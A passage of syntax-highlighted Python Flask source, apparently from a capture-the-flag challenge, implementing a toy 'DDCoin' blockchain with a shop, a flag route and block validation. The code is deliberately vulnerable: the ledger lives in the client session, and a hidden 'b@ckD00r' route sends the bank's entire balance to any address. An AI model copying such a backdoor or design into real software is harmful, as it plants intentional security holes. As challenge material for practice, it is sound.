-    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown parent block"</span><span class="token punctuation">)</span>
-    tail <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
-    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>
-
-    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please put a transaction array in the block'</span><span class="token punctuation">)</span>
-    new_utxo_ids <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
-        has_attrs<span class="token punctuation">(</span>tx<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-        <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
-            has_attrs<span class="token punctuation">(</span>utxo<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of output utxo"</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> new_utxo_ids<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"output utxo of same id({}) already exists."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-            new_utxo_ids<span class="token punctuation">.</span>add<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of amount of output utxo"</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid amount of output utxo"</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of address of output utxo"</span><span class="token punctuation">)</span>
-            <span class="token keyword">try</span><span class="token punctuation">:</span>
-                addr_to_pubkey<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-            <span class="token keyword">except</span><span class="token punctuation">:</span>
-                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid type of address({})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-            utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>
-        tot_output <span class="token operator">=</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo ids in tx should be array"</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo signatures in tx should be array"</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"lengths of arrays of ids and signatures of input utxos should be the same"</span><span class="token punctuation">)</span>
-        tot_input <span class="token operator">=</span> <span class="token number">0</span>
-        tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
-        tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
-        <span class="token keyword">for</span> utxo_id<span class="token punctuation">,</span> signature <span class="token keyword">in</span> zip<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of input utxo"</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> utxo_id <span class="token operator">not</span> <span class="token keyword">in</span> utxos<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid id of input utxo. Input utxo({}) does not exist or it has been consumed."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
-            utxo <span class="token operator">=</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>
-            <span class="token keyword">if</span> type<span class="token punctuation">(</span>signature<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of signature of input utxo"</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> <span class="token operator">not</span> verify_utxo_signature<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>
-                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Signature of input utxo is not valid. You are not the owner of this input utxo({})!"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
-            tot_input <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
-            <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>
-        <span class="token keyword">if</span> tot_output <span class="token operator">></span> tot_input<span class="token punctuation">:</span>
-            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"You don't have enough amount of DDCoins in the input utxo! {}/{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tot_input<span class="token punctuation">,</span> tot_output<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>
-
-    block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-    block_hash <span class="token operator">=</span> int<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> block_hash <span class="token operator">></span> difficulty<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please provide a valid Proof-of-Work'</span><span class="token punctuation">)</span>
-    block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> tail<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span>
-    <span class="token keyword">if</span> len<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'The blockchain is too long. Use ./reset to reset the blockchain'</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'A same block is already in the blockchain'</span><span class="token punctuation">)</span>
-    session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> block
-    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>
-
-<span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
-        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
-        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
-        <span class="token comment" spellcheck="true"># First, the bank issued some DDCoins ...</span>
-        total_currency_issued <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
-        genesis_transaction <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create DDCoins from nothing</span>
-        genesis_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>EMPTY_HASH<span class="token punctuation">,</span> <span class="token string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>genesis_transaction<span class="token punctuation">]</span><span class="token punctuation">)</span>
-        session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span>
-        genesis_block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
-        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block
-
-        <span class="token comment" spellcheck="true"># Then, the bank was hacked by the hacker ...</span>
-        handout <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>hacker_address<span class="token punctuation">,</span> <span class="token number">999999</span><span class="token punctuation">)</span>
-        reserved <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
-        transferred <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>handout<span class="token punctuation">,</span> reserved<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>
-        second_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'HAHA, I AM THE BANK NOW!'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
-        append_block<span class="token punctuation">(</span>second_block<span class="token punctuation">)</span>
-
-        <span class="token comment" spellcheck="true"># Can you buy 2 diamonds using all DDCoins?</span>
-        third_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>second_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'a empty block'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-        append_block<span class="token punctuation">(</span>third_block<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">get_balance_of_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    tail <span class="token operator">=</span> find_blockchain_tail<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> calculate_balance<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail
-
-@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">homepage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    announcement <span class="token operator">=</span> <span class="token string">'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '</span>
-    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> _ <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    genesis_block_info <span class="token operator">=</span> <span class="token string">'hash of genesis block: '</span> <span class="token operator">+</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>
-    addr_info <span class="token operator">=</span> <span class="token string">'the bank\'s addr: '</span> <span class="token operator">+</span> bank_address <span class="token operator">+</span> <span class="token string">', the hacker\'s addr: '</span> <span class="token operator">+</span> hacker_address <span class="token operator">+</span> <span class="token string">', the shop\'s addr: '</span> <span class="token operator">+</span> shop_address
-    balance_info <span class="token operator">=</span> <span class="token string">'Balance of all addresses: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>balance<span class="token punctuation">)</span>
-    utxo_info <span class="token operator">=</span> <span class="token string">'All utxos: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span>
-    blockchain_info <span class="token operator">=</span> <span class="token string">'Blockchain Explorer: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-    view_source_code_link <span class="token operator">=</span> <span class="token string">"&lt;a href='source_code'>View source code&lt;/a>"</span>
-    <span class="token keyword">return</span> announcement<span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'&lt;br />&lt;br />\r\n\r\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>view_source_code_link<span class="token punctuation">,</span> genesis_block_info<span class="token punctuation">,</span> addr_info<span class="token punctuation">,</span> balance_info<span class="token punctuation">,</span> utxo_info<span class="token punctuation">,</span> blockchain_info<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-
-@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> <span class="token string">'To get the flag, you should buy 2 diamonds from the shop. You have {} diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> shop_address
-
-<span class="token keyword">def</span> <span class="token function">find_enough_utxos</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    collected <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">==</span> addr_from<span class="token punctuation">:</span>
-            amount <span class="token operator">-=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
-            collected<span class="token punctuation">.</span>append<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> amount <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> collected<span class="token punctuation">,</span> <span class="token operator">-</span>amount
-    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'no enough DDCoins in '</span> <span class="token operator">+</span> addr_from<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    input_utxo_ids<span class="token punctuation">,</span> the_change <span class="token operator">=</span> find_enough_utxos<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span>
-    outputs <span class="token operator">=</span> <span class="token punctuation">[</span>create_output_utxo<span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">]</span>
-    <span class="token keyword">if</span> the_change <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
-        outputs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>create_output_utxo<span class="token punctuation">(</span>addr_from<span class="token punctuation">,</span> the_change<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> create_tx<span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> outputs<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span>
-
-@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address>'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">free_ddcoin</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'The bank has no money now.'</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        address <span class="token operator">=</span> str<span class="token punctuation">(</span>address<span class="token punctuation">)</span>
-        addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># to check if it is a valid address</span>
-        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> bank_address<span class="token punctuation">,</span> address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>
-        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'b@cKd00R tr1993ReD'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
-        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>
-        <span class="token keyword">return</span> str<span class="token punctuation">(</span>balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' DDCoins are successfully sent to '</span> <span class="token operator">+</span> address
-    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
-        <span class="token keyword">return</span> <span class="token string">'ERROR: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
-
-DIFFICULTY <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token string">'00000'</span> <span class="token operator">+</span> <span class="token string">'f'</span> <span class="token operator">*</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
-@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/create_transaction'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">create_tx_and_check_shop_balance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        block <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
-        append_block<span class="token punctuation">(</span>block<span class="token punctuation">,</span> DIFFICULTY<span class="token punctuation">)</span>
-        msg <span class="token operator">=</span> <span class="token string">'transaction finished.'</span>
-    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
-        <span class="token keyword">return</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
-
-    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1000000</span><span class="token punctuation">:</span>
-        <span class="token comment" spellcheck="true"># when 1000000 DDCoins are received, the shop will give you a diamond</span>
-        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
-        <span class="token comment" spellcheck="true"># and immediately the shop will store the money somewhere safe.</span>
